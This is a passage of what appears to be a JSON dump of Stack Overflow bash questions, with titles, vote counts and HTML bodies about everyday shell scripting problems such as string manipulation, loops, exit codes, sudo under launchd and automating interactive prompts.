-p 19999 -e /home/reg/Dropbox/New_semiosNET/Research_and_Development/Puffer_and_Traps/Repeaters_Network/UBC_LOGS/log1349544129.tar.bz2 ] then echo \"okidoke\"; else \"not okay!\" fi\n-sh: syntax error: unexpected \"else\" (expecting \"then\") \n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12845189,"title":"Creation and copy directories","body":"<p>I'm trying to write a script that takes a directory, copies all its files to a new directory that I create. So the script has two arguments. The first being an existing directory, and the second being the created directory.</p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>dir1=$1\ndir2=$2\n\nmkdir $2\ncp $1/. $2\n</code></pre>\n\n<p>Yet my new directory is always empty. Is it a syntax error? </p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12778547,"title":"Command not acting properly in script","body":"<p>The command:</p>\n\n<pre><code>value=${value%?}\n</code></pre>\n\n<p>will remove the last character from a variable.\nIs there any logical reason why it would not work from within a script?\nIn my script it has no effect whatsoever.</p>\n\n<pre><code>if [[ $line =~ \"What I want\" ]]\n    then\n            if [[ $CURRENT -eq 3 ]]\n            then\n                    echo  \"line is \" $line \n                    value=`echo \"$line\" | awk '{print $4}'`\n                    echo \"value = \"$value   \n                    value=${value%?}\n                    echo \"value = $value \"\n\n                    break\n            fi\nfi\n</code></pre>\n\n<p>I cant post the whole script, but this is the piece I refer to. The loop is being entered properly, but the 2 echo $value lines return the same thing.</p>\n\n<p>Edit - this question still stands. The code works fine line bu line in a terminal, but all together in a script it fails.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12844631,"title":"Bash basename syntax","body":"<p>I'm trying to write a script that takes the basename of an argument, then checks if there is an extension in that argument. If there is, it prints the extension.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>file=basename $1\next=${file%*}\necho ${file#\"$stub\"}\necho $basename $1\n</code></pre>\n\n<p>I'm echoing the final $basename $1 to check what the output of basename is.</p>\n\n<p>Some tests reveal:</p>\n\n<pre><code>testfile.sh one.two\n./testfile: line 2: one.two: command not found\none.two\n\ntestfile.sh ../tester\n./testfile: line 2: ../tester: No such file or directory\n../tester\n</code></pre>\n\n<p>So neither $basename $1 are working. I know it's a syntax error so could someone explain what I'm doing wrong? </p>\n\n<p>EDIT:</p>\n\n<p>I've solved my problem now with:</p>\n\n<pre><code>file=$(basename \"$1\" )\nstub=${file%.*}\necho ${file#\"$stub\"}\n</code></pre>\n\n<p>Which reduces my argument to a basename, thank you all.</p>\n"},{"tags":["bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12807113,"title":"String manipulation Bash-Extensions","body":"<p>In my script I'm trying to take a string, then output the extension of a string if it has one. So essentially I take the basename of a file, then output anything that comes after a period.</p>\n\n<p>What's the syntax to do something like this? </p>\n\n<p>For example</p>\n\n<pre><code>dotcutter.sh\nfile=testfile.jpg\n</code></pre>\n\n<p>the script should output .jpg</p>\n\n<p>EDIT:</p>\n\n<p>I've solved my problem now with:</p>\n\n<pre><code>file=$(basename \"$1\" )\nstub=${file%.*}\necho ${file#\"$stub\"}\n</code></pre>\n\n<p>Which reduces my argument to a basename, thank you all. </p>\n"},{"tags":["bash","shell","sed","hashtable"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":88,"score":-1,"question_id":12839174,"title":"associative array in bash","body":"<p>I found an implementation of the associative array <a href=\"http://stackoverflow.com/questions/688849/associative-arrays-in-shell-scripts\">here</a>  and would like to understand what the code actually does. Here are the piece of the code I don't understand, and would appreciate the explanation.\n'</p>\n\n<pre><code>put() {\n    if [ \"$#\" != 3 ]; then exit 1; fi  \n    mapName=$1; key=$2; value=`echo $3 | sed -e \"s/ /:SP:/g\"`  #dont understand \n    eval map=\"\\\"\\$$mapName\\\"\"  **#dont understand** \n    map=\"`echo \"$map\" | sed -e \"s/--$key=[^ ]*//g\"` --$key=$value\"  #dont understand \n    eval $mapName=\"\\\"$map\\\"\"  #dont understand \n}\nget() {\n    mapName=$1; key=$2\n\n    map=${!mapName}\n    #dont understand \n    value=\"$(echo $map |sed -e \"s/.*--${key}=\\([^ ]*\\).*/\\1/\" -e 's/:SP:/ /g' )\"  \n}\n\ngetKeySet() {\n    if [ \"$#\" != 1 ]; \n    then \n        exit 1; \n    fi\n\n    mapName=$1; \n\n    eval map=\"\\\"\\$$mapName\\\"\"\n\n    keySet=`\n           echo $map | \n           sed -e \"s/=[^ ]*//g\" -e \"s/\\([ ]*\\)--/\\1/g\"   #dont understand \n          ` \n}\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["bash","file-io","script"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":12844095,"title":"How do I use Bash to create a copy of a file with an extra suffix before the extension?","body":"<p>This title is a little confusing, so let me break it down. Basically I have a full directory of files with various names and extensions:</p>\n\n<pre><code>MainDirectory/\n    image_1.png\n    foobar.jpeg\n    myFile.txt\n</code></pre>\n\n<p>For an iPad app, I need to create copies of these with the suffix <em>@2X</em> appended to the end of all of these file names, before the extension - so I would end up with this:</p>\n\n<pre><code>MainDirectory/\n    image_1.png\n    image_1@2X.png\n    foobar.jpeg\n    foobar@2X.jpeg\n    myFile.txt\n    myFile@2X.txt\n</code></pre>\n\n<p>Instead of changing the file names one at a time by hand, I want to create a script to take care of it for me. I currently have the following, but it does not work as expected:</p>\n\n<pre><code>#!/bin/bash\n\nFILE_DIR=.\n\n#if there is an argument, use that as the files directory. Otherwise, use .\nif [ $# -eq 1 ]\nthen\n  $FILE_DIR=$1\nfi\n\nfor f in $FILE_DIR/*\ndo\n  echo \"Processing $f\"\n  filename=$(basename \"$fullfile\")\n  extension=\"${filename##*.}\"\n  filename=\"${filename%.*}\"\n  newFileName=$(echo -n $filename; echo -n -@2X; echo -n $extension)\n  echo Creating $newFileName\n  cp $f newFileName\ndone\n\nexit 0\n</code></pre>\n\n<p>I also want to keep this to pure bash, and not rely on os-specific calls. What am I doing wrong? What can I change or what code will work, in order to do what I need?</p>\n"},{"tags":["bash","ubuntu","chef"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":10164323,"title":"using bash to automate answering of prompts for django sync for graphite install","body":"<p>I am using chef to automate the install of graphite on ubuntu.  I need to automate the python manage.py syncdb using bash or by any other means. </p>\n\n<pre><code>ubuntu@ip-xxx-xxx-xxx:/opt/graphite/webapp/graphite$ sudo python manage.py syncdb\nCreating tables ...\nCreating table account_profile\nCreating table account_variable\nCreating table account_view\nCreating table account_window\nCreating table account_mygraph\nCreating table dashboard_dashboard_owners\nCreating table dashboard_dashboard\nCreating table events_event\nCreating table auth_permission\nCreating table auth_group_permissions\nCreating table auth_group\nCreating table auth_user_user_permissions\nCreating table auth_user_groups\nCreating table auth_user\nCreating table auth_message\nCreating table django_session\nCreating table django_admin_log\nCreating table django_content_type\nCreating table tagging_tag\nCreating table tagging_taggeditem\n\nYou just installed Django's auth system, which means you don't have any superusers defined.\nWould you like to create one now? (yes/no): yes\nUsername (Leave blank to use 'root'): admin\nE-mail address: test@gmail.com\nPassword: \nPassword (again): \nSuperuser created successfully.\nInstalling custom SQL ...\nInstalling indexes ...\nNo fixtures found.\n</code></pre>\n\n<p>I need to automate the following prompts with the below</p>\n\n<pre><code>Would you like to create one now? (yes/no): yes\nUsername (Leave blank to use 'root'): admin\nE-mail address: test@gmail.com\nPassword: test101\nPassword (again): test101\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["bash","gnuplot","fit"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12843423,"title":"How to tell gnuplot not to print fit log on screen?","body":"<p>I'm writing a bash script that, among several more things, calls gnuplot to fit a few data files. When it does so my terminal gets flooded with the gnuplot fit log.</p>\n\n<p>I do not want that, I'd like that gnuplot just kept the fit log to the file 'fit.log', rather than printing it on screen. But I can't find a gnuplot command to prevent the fit log file from being printed on terminal.</p>\n\n<p>I do not want to redirect all gnuplot text output to a file because I would like to know just by looking at the terminal wheter it returned any errors.</p>\n\n<p>What can I do?</p>\n\n<p>Thanks,\n         Ferdinando</p>\n"},{"tags":["linux","bash","shell","unix","aix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12843149,"title":"Adding multiple values to each column","body":"<p>I'm really new at using awk/sed</p>\n\n<p>So, I have text file that is called performance.log that has following info</p>\n\n<pre><code>CPU 1 2 3 4 5 6\nRAM 2 3 4 5 6 7\nHAR 3 4 5 6 7 8\n</code></pre>\n\n<p>And with in the code in performance-eval.sh, function generates following info</p>\n\n<pre><code>Cur_CPU=10\nCur_RAM=11\nCur_HAR=13\n</code></pre>\n\n<p>I want to insert and save Cur_CPU,RAM,HAR to performance.log.\nCur_CPU will go to first row, second column\nCur_RAM will go to second row, second column\nCur_HAR will go to third row, second column</p>\n\n<p>So that resulting performance.log would be</p>\n\n<pre><code>CPU 10 1 2 3 4 5 6\nRAM 11 2 3 4 5 6 7\nHAR 13 3 4 5 6 7 8\n</code></pre>\n\n<p>I'm not sure how to add 3 different values into 3 different columns. \nThanks for your help!</p>\n"},{"tags":["osx","bash","launchd"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":81,"score":2,"question_id":12835871,"title":"running sudo command in bash script and running it with launchd","body":"<p>I have a bash script that I would like to run with a launchd plist file on OS X. The problem I have is is that the bash script contains sudo commands and it is stopping it from running. So for example my bash script looks like this:</p>\n\n<pre><code>#!/bin/bash\nsudo /opt/local/bin/bindfs -u user1 /Library/WebServer/Documents/user1 /vhosts/user1/public_html\nsudo /opt/local/bin/bindfs -u user2 /Library/WebServer/Documents/user2 /vhosts/user2/public_html\n</code></pre>\n\n<p>and my com.test.bindfs.plist file looks like this (created with Lingon):</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;GroupName&lt;/key&gt;\n    &lt;string&gt;admin&lt;/string&gt;\n    &lt;key&gt;Label&lt;/key&gt;\n    &lt;string&gt;com.jamespayne.bindfs&lt;/string&gt;\n    &lt;key&gt;ProgramArguments&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;/usr/bin/bindfs.sh&lt;/string&gt;\n    &lt;/array&gt;\n    &lt;key&gt;RunAtLoad&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>\n\n<p>I have checked to see that the script works by running it after startup and entering a password but it wont run at startup. The launchd plist is running but it comes up with the following error:</p>\n\n<p>sudo: no tty present and no askpass program specified</p>\n\n<p>Anybody know how to get this working or why I might get that error. Thanks.</p>\n"},{"tags":["bash","echo","increment"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12842714,"title":"A variable that changes value in a bash for loop","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6348902/how-can-i-add-numbers-in-a-bash-script\">How can I add numbers in a bash script</a>  </p>\n</blockquote>\n\n\n\n<p>I have a variable that changes value in a for loop:</p>\n\n<pre><code>for i in {1..10..1}\n  do\n    while ((count &lt; max+1))\n      do \n        echo $count &gt;&gt; /directory/outfile_${max}.txt\n        ((count++))\n      done\n    max=$max+100\n  done\n</code></pre>\n\n<p>The ten outfiles should have the names \"outfile_100.txt\", \"outfile_200.txt\" etc..</p>\n\n<p>But what happens is that they become like \"outfile_100+100+100....txt\"</p>\n\n<p>Is it in how I resize <code>max</code>?</p>\n"},{"tags":["bash","shell","tmux"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12843453,"title":"tmux Escape key exits server","body":"<p>I'm using tmux on a macOsX moutain lion (10.8)</p>\n\n<p>Whenever i'm in a terminal, pressing the Escape button results in the connection to the server being lost and tmux actually exiting. I experience the same behavior regardless in iterm2, terminal and while using any of zsh, bash or a normal login shell.</p>\n\n<p>That's how it looks like:</p>\n\n<p><img src=\"http://i.stack.imgur.com/ybORC.png\" alt=\"enter image description here\"></p>\n\n<p>Any hints? :)</p>\n"},{"tags":["bash","shell","vim","zsh"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":118,"score":5,"question_id":12834370,"title":"Run vim command from commandline","body":"<p>There are lots of SO questions on running shell programs from vim. What I'm wondering is if it is possible to do the reverse - i.e.</p>\n\n<pre><code>$ vim :BundleInstall\n</code></pre>\n\n<p>for example, to allow me to run <a href=\"https://github.com/gmarik/vundle\">BundleInstall</a> as part of a script, rather than having to open Vim and run it manually on first running? Is this possible?</p>\n"},{"tags":["linux","bash","time"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12841925,"title":"linux time command resulting real is less than user","body":"<p>When I test a perl script under linux and use <code>time sh -c</code> to measure the time spent, I got a weird result:</p>\n\n<pre><code>real    14m11.903s\nuser    34m39.319s\nsys     16m54.074s\n</code></pre>\n\n<p>which means the real time spent is even less than user time. And visually counting the time by myself, the script didn't spent as much as 34 minutes, and real time is closer to what I see. Has anyone have any clue about this? Thanks.</p>\n"},{"tags":["bash","date","ubuntu","delete","logging"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":292,"score":2,"question_id":8399493,"title":"Is there a way to delete all log entries in a file older than a certain date? (BASH)","body":"<p>I have log file in which I'm trying to delete all entries older than a specified date. Though I haven't succeeded with this yet. What I've tested so far is having an input for what the entries must be older than to be deleted and then loop like this:</p>\n\n<pre><code>#!/bin/bash\n\nCOUNTER=7\nDATE=$(date -d \"-${COUNTER} days\" +%s)\nDATE=$(date -d -@${DATE} \"+%Y-%m-%d\")\n\nwhile [ -n \"$(grep $DATE test.txt)\" ]; do\n\n    sed -i \"/$DATE/d\" test.txt\n\n    COUNTER=$((${COUNTER}+1))\n    DATE=$(date -d \"-${COUNTER} days\" +%s)\n    DATE=$(date -d @${DATE} +\"%Y-%m-%d\")\ndone\n</code></pre>\n\n<p>This kind of works except when a log entry doesn't exist for date. When it doesn't find a match it aborts the loop and the even older entries are kept.</p>\n\n<p><strong>Update</strong></p>\n\n<p>This was how I solved it:</p>\n\n<pre><code>#!/bin/bash\n\nCOUNTER=$((7+1))\nDATE=$(date -d \"-${COUNTER} days\" +%s)\nDATE=$(date -d -@${DATE} \"+%Y-%m-%d\")\n\nif [ -z \"$(grep $DATE test.txt)\" ]; then\n   exit 1\nfi\n\nsed -i \"1,/$DATE/d\" test.txt\n</code></pre>\n"},{"tags":["bash","exit-code","bash-function"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12840740,"title":"return value from subshell and output to local variables","body":"<p>I've found the strange behaviour for me, which I can't explain. \nThe following code is work OK:</p>\n\n<pre><code>function prepare-archive {\nblah-blah-blah...\n_SPEC_FILE=$(check-spec-file \"$_GIT_DIR/packaging/\")\nexit $?\nblah-blah-blah...\n}\n</code></pre>\n\n<p>means I get value which I expect:</p>\n\n<pre><code>bash -x ./this-script.sh:\n++ exit 1\n+ _SPEC_FILE='/home/likern/Print/Oleg/print-service/packaging/print-service.spec\n/home/likern/Print/Oleg/print-service/packaging/print-service2.spec'\n+ exit 1\n</code></pre>\n\n<p>As soon as I add <code>local</code> definition to variable:</p>\n\n<pre><code>local _SPEC_FILE=$(check-spec-file \"$_GIT_DIR/packaging/\")\n</code></pre>\n\n<p>I get following:</p>\n\n<pre><code>bash -x ./this-script.sh:\n++ exit 1\n+ local '_SPEC_FILE=/home/likern/Print/Oleg/print-service/packaging/print-service.spec\n/home/likern/Print/Oleg/print-service/packaging/print-service2.spec'\n+ exit 0\n$:~/MyScripts$ echo $?\n0\n</code></pre>\n\n<p><strong>Question:</strong> Why? What has happened? Can I catch output from subshell to <code>local</code> variable and check subshell's return value reliably?</p>\n\n<p><strong>P.S.</strong>: <code>prepare-archive</code> is called in the main shell script. The first <code>exit</code> is the <code>exit</code> from <code>check-spec-file</code> function, the second from <code>prepare-archive</code> function - this function itself is executed from main shell script. I return value from <code>check-spec-file</code> by <code>exit 1</code>, then pass this value to <code>exit $?</code>. Thus I expect they should be the same.</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12839985,"title":"Handling exit status in Bash","body":"<p>Can anyone come up with a shorter implementation of the function <em>test</em> below (which prints the same error message and has the same exit status)?</p>\n\n<pre><code>function test\n{\n   some-command\n   exit_status=$?\n   if [ $exit_status -ne 0 ]; then\n      echo \"some-command failed with exit status $exit_status\" &gt;&amp;2\n   fi\n   return $exit_status\n}\n</code></pre>\n"},{"tags":["bash","while-loop","do"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12840769,"title":"Bash while loop syntax error in do","body":"<p>I´m trying do do a simple counter:</p>\n\n<pre><code>max=100\ncount=1\nwhile [[ $count -le $max]]\n  do\n    echo \"$count\"\n    ((count++))\n  done\n</code></pre>\n\n<p>This gives me a syntax error in conditional expression near do.</p>\n\n<p>What´s my issue? (probably something obvious)</p>\n\n<p>The idea is then to raise the <code>max</code> from 100 to 200 and so forth in a superior loop so I will get a new file to manipulate with a python program 100 lines each time, but that´s irrelevant here.</p>\n"},{"tags":["linux","bash","shell","ubuntu"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":289,"score":1,"question_id":3665533,"title":"Quoting in a bash variable assignment","body":"<p>Using the following simplified code extract:</p>\n\n<pre><code>DIR='a b'\nmount_command=\"./mount.cpfs $loop $DIR -f $OPTS\"\nsudo $mount_command\n</code></pre>\n\n<p>Executes this line when trace is on:</p>\n\n<pre><code>+ sudo ./mount.cpfs /dev/loop0 a b -f -o default_permissions,allow_other,attr_timeout=0\n</code></pre>\n\n<p>But <code>DIR</code> is not quoted, and so <code>a</code> and <code>b</code> are passed as different parameters, rather than the same to <code>./mount.cpfs</code>.</p>\n\n<p><strong>What's the best way to go about creating a command sequence like this, and then expanding it into a later command line?</strong></p>\n\n<p>Please keep in mind the code example is simplified to the core problem, I'm using <code>mount_command</code> in several places with various additions before and after it, and <code>DIR</code> is passed in by the user. I've tried several combinations of quoting <code>DIR</code> when assigning to <code>mount_command</code>, and a primitive attempt at using an array.</p>\n\n<h2>Example Usage of <code>mount_command</code></h2>\n\n<pre><code>mount_command=\"./mount.cpfs $loop $DIR -f $OPTS\"\ncase \"$MODE\" in\n    gdb)\n        sudo gdb -return-child-result -x gdbbatch \\\n            --args $mount_command\n        ;;\n    normal)\n        sudo $mount_command\n        ;;\n    valgrind)\n        sudo valgrind --track-fds=yes --leak-check=full --malloc-fill=0x80 \\\n            --free-fill=0xff $mount_command\n        ;;\n    *)\n        echo \"Mode '$MODE' unknown\"\n        mounted=''\n        exit 2\n        ;;\nesac\n</code></pre>\n\n<h2>Update0</h2>\n\n<p>Please test your suggestions, I don't think the solution is straightforward.</p>\n"},{"tags":["perl","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12836289,"title":"Running a program that requires a password on the command line from a Perl script","body":"<p>I have written a Perl wrapper around a shell script. I am using IPC::Run::Simple to execute system commands.  As an example: </p>\n\n<pre><code>run (\"mkdir ~$usr/12.2.0_cp/faiz_cpv/$pdate\") or die \"Error $ERR\";\nrun (\"cp ~$usr/12.2.0_cp/faiz_cpv/MPlist.lst ~$usr/12.2.0_cp/faiz_cpv/$pdate\") || die \"Error: $ERR\";\nrun (\"cd ~$usr/12.2.0_cp/faiz_cpv/$pdate; sh /opsutils/mfg_top/rel/CPV/bin/list_generation.sh . MPlist.lst mfg_relall_us\\@oracle.com\") or die \"error $ERR\";\n.\n.\n</code></pre>\n\n<p>One of these shell scripts requires the user of the script to enter their password. That is, a message is printed on stdout and the password is accepted via the shell. A number of calls are made to this shell script during the entire process which means a user must reenter his password a number of times. </p>\n\n<p>Is there a way by which I can request user for the password at the command line itself, and pass that password implicitly instead of prompting user for the password again and again?</p>\n"},{"tags":["bash","sed","awk","grep","cut"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":29,"score":-1,"question_id":12839005,"title":"How to grep column after second pipe","body":"<p>Example:</p>\n\n<pre><code>3|100|test@test.com|0|0|6:1,10,11,12,13,2,3,4,5,6,9|7:1,10,11,13,16,2,4,5,6,9|\n</code></pre>\n\n<p>Expected view after grep:</p>\n\n<pre><code>test@test.com\n</code></pre>\n"},{"tags":["osx","bash","diffmerge"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12839081,"title":"mac osx, git mergetool, diffmerge, command not found","body":"<p>I installed DiffMerge in Applications folder. \nI can't get DiffMerge run on its own, nor when I use <code>git mergetool</code>\nMy PATH variable: </p>\n\n<pre><code>/Applications/DiffMerge.app:/Applications/:/Applications/:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/git/bin:/usr/texbin:/usr/X11/bin$$$:/usr/X11/bin\n</code></pre>\n\n<p>What am I missing? thanks</p>\n"},{"tags":["bash","ssh","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12835429,"title":"expect error in bash expression","body":"<p>I have the following expect command that i use in my bash script in order to set passwordless ssh connection.</p>\n\n<pre><code>VAR=$(expect -c '\n     spawn ssh-copy-id -i '\"$SSH_KEY_PATH_PUB $REMOTE_HOST_USER@$REMOTE_HOST_IP \"'   \n     expect \"*?assword:*\"\n     send \"'\"$REMOTE_HOST_PASSWD\"'\\r\";\n     expect { \n     \"Permission denied, please try again.\" {\n        exit '\"$WRONG_PASSWORD\"' \n     }\n }\n ')\n</code></pre>\n\n<p>I am expecting password string as \"<em>?assword:</em>\" in order to send password.But whatever i write for the expect block it works.if i write </p>\n\n<pre><code>expect \"xxxx\"\nexpect \"yyyy\"\n</code></pre>\n\n<p>it also works, so i think it does not enter that block?.What is the solution </p>\n"},{"tags":["bash","shell","makefile","make","ubuntu-12.04"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12838278,"title":"Using curly brackets for variable expansion in makefile doesn't work","body":"<p>When I run below command on shell, it works properly. but if I write it in a Makefile and call it with \"make\" command it doesn't work.</p>\n\n<blockquote>\n  <p>cp wpa_{cli,supplicant,passphrase,event} /usr/local/bin/</p>\n</blockquote>\n\n<p>error after \"make\" command:</p>\n\n<blockquote>\n  <p>cp: cannot stat `wpa_{cli,supplicant,passphrase,event}': No such file\n  or directory</p>\n</blockquote>\n\n<p>What can i do to make it work with Makefile? I use Ubuntu 12.04. Same Makefile works on other linux distributions.</p>\n"},{"tags":["linux","bash","unix","environment-variables"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":94,"score":-2,"question_id":12837112,"title":"Set up of environment variable PATH in bash shell","body":"<p>The Environment PATH is much larger in PROD as compared to QA:</p>\n\n<pre><code>PATH=.:/home/imc:/home/imc/bin:$HOME:/usr/local/sbin:$PATH\n</code></pre>\n\n<p>We are using the same setup environment file in PROD and QA but we still find difference.</p>\n\n<p>The longer path means it effects while running the job. So any idea how to improve the PATH?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12836860,"title":"Bash - Echo a variable using another variable (?)","body":"<p>Thank you very much in advance for helping!</p>\n\n<p>I have this variables:</p>\n\n<pre><code>scene1=lounge\nscene2=bedroom\nscene3=bathroom\n</code></pre>\n\n<p>What I want to do is a loop, and for every file in a particular folder, echo the variable scene#</p>\n\n<pre><code>order=1\nfor f in $(find $dest_scenes/*.xml -maxdepth 0 )\ndo\n    scene_name=scene$order #scene1, scene2, scene3\n    echo $scene_name\ndone\norder=$(expr $order + 1)\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>scene1\nscene2\nscene3\n</code></pre>\n\n<p>What I would like to:</p>\n\n<pre><code>lounge\nbedroom\nbathroom\n</code></pre>\n\n<p>I don't want to get $scene_name, I want to got $($scene_name) if you know what I mean...</p>\n\n<p>Thank you!!!</p>\n"},{"tags":["bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12836182,"title":"Passing arguments to a bash script","body":"<pre><code>linux 3.5.6-1.fc17.x86_64\nGNU bash, version 4.2.37\n</code></pre>\n\n<p>Hello,</p>\n\n<p>I have the following bash script file. That I am using to test my program. However, I want to be able to test with and without valgrind. So I get the argument from the command line 'valgrind' and compare in the if statement. However, my test cases will get bigger over time, and I will have to repeat a lot of code in the if-else. Is there a way to minimize this if-else?</p>\n\n<p>Many thanks for any suggestions,</p>\n\n<pre><code>#!/bin/bash\n\n# Abort on error\nset -e\n\necho $1\n\nif [ \"$1\" == \"valgrind\" ]; then\n    echo \"TEST STARTED RUNNING WITH VALGRIND\"\n    echo \"TEST CREATE DATABASE\"\n    valgrind ./db db.dat c\n    echo \"TEST CREATE DATABASE OK\"\n\n    echo \"TEST INSERT\"\n    valgrind ./db db.dat s 1 steve steve@mail.com\n    valgrind ./db db.dat s 2 ben ben@live.com\n    valgrind ./db db.dat s 3 lisa lisalow@mailcity.com\n    echo \"TEST INSERT OK\"\n\n    echo \"TEST LIST\"\n    valgrind ./db db.dat l\n    echo \"TEST LIST OK\"\n\n    echo \"TEST DELETE\"\n    valgrind ./db db.dat d 2\n    echo \"TEST DELETE OK\"\n\n    echo \"TEST LIST\"\n    valgrind ./db db.dat l\n    echo \"TEST LIST OK\"\n\n    echo \"TEST FETCH\"\n    valgrind ./db db.dat g 2\n    valgrind ./db db.dat g 3\n    echo \"TEST FETCH OK\"\n\n    echo \"TEST COMPLETED OK\"\nelse\n    echo \"TEST STARTED\"\n    echo \"TEST CREATE DATABASE\"\n    ./db db.dat c\n    echo \"TEST CREATE DATABASE OK\"\n\n    echo \"TEST INSERT\"\n    ./db db.dat s 1 steve steve@mail.com\n    ./db db.dat s 2 ben ben@live.com\n    ./db db.dat s 3 lisa lisalow@mailcity.com\n    echo \"TEST INSERT OK\"\n\n    echo \"TEST LIST\"\n    ./db db.dat l\n    echo \"TEST LIST OK\"\n\n    echo \"TEST DELETE\"\n    ./db db.dat d 2\n    echo \"TEST DELETE OK\"\n\n    echo \"TEST LIST\"\n    ./db db.dat l\n    echo \"TEST LIST OK\"\n\n    echo \"TEST FETCH\"\n    ./db db.dat g 2\n    ./db db.dat g 3\n    echo \"TEST FETCH OK\"\n\n    echo \"TEST COMPLETED OK\"\nfi\n</code></pre>\n"},{"tags":["bash","shell","redirect","variables","stderr"],"answer_count":7,"favorite_count":17,"up_vote_count":39,"down_vote_count":0,"view_count":34892,"score":39,"question_id":962255,"title":"How to store standard error in a variable in a Bash script","body":"<p>Let's say I have a script like the following:</p>\n\n<p>useless.sh</p>\n\n<pre><code>echo \"This Is Error\" 1&gt;&amp;2\necho \"This Is Output\"\n</code></pre>\n\n<p>And I have another shell script:</p>\n\n<p>alsoUseless.sh</p>\n\n<pre><code>./useless.sh | sed 's/Output/Useless/'\n</code></pre>\n\n<p>I want to capture \"This Is Error\", or any other stderr from useless.sh, into a variable. \nLet's call it ERROR.</p>\n\n<p>Notice that I am using stdout for something. I want to continue using stdout, so redirecting stderr into stdout is not helpful, in this case.</p>\n\n<p>So, basically, I want to do</p>\n\n<pre><code>./useless.sh 2&gt; $ERROR | ...\n</code></pre>\n\n<p>but that obviously doesn't work.</p>\n\n<p>I also know that I could do</p>\n\n<pre><code>./useless.sh 2&gt; /tmp/Error\nERROR=`cat /tmp/Error`\n</code></pre>\n\n<p>but that's ugly and unnecessary.</p>\n\n<p>Unfortunately, if no answers turn up here that's what I'm going to have to do.</p>\n\n<p>I'm hoping there's another way.</p>\n\n<p>Anyone have any better ideas?</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":558,"score":2,"question_id":3966048,"title":"access arguments to bash script inside a function","body":"<p>Inside a function, <code>$1 ... $n</code> are the parameters passed to that function.\nOutside a function <code>$1 ... $n</code> are the parameters passed to the script.</p>\n\n<p>Can I somehow access the parameters passed to the script inside a function?</p>\n"},{"tags":["bash","command"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12834446,"title":"test command in unix doesn't print output","body":"<p>Why is there no output to the command <code>test 3 -lt 6</code> in the unix terminal? Shouldn't test output a 0 or a 1?</p>\n\n<p>I did a man test and it says </p>\n\n<blockquote>\n  <p>Exit with the status determined by EXPRESSION</p>\n</blockquote>\n"},{"tags":["bash","shell","documentation","ksh"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1011,"score":5,"question_id":1190427,"title":"Shell documentation (bash, ksh)","body":"<p>is there a tool out there similar to <a href=\"http://en.wikipedia.org/wiki/Javadoc\" rel=\"nofollow\">Javadoc</a> or <a 